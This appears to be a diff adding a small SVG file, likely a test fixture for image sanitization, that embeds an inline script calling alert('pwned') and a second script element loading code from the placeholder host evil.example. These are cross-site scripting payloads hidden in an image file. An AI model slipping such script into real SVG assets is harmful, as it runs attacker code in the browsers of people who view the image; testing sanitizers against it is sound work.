@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100mm" height="80mm" viewBox="0 0 100 80">
+  <script type="text/javascript"><![CDATA[alert('pwned');]]></script>
+  <script type="text/javascript" href="http://evil.example/x.js"/>
+  <rect x="10" y="10" width="20" height="10" fill="none" stroke="black"/>
+</svg>
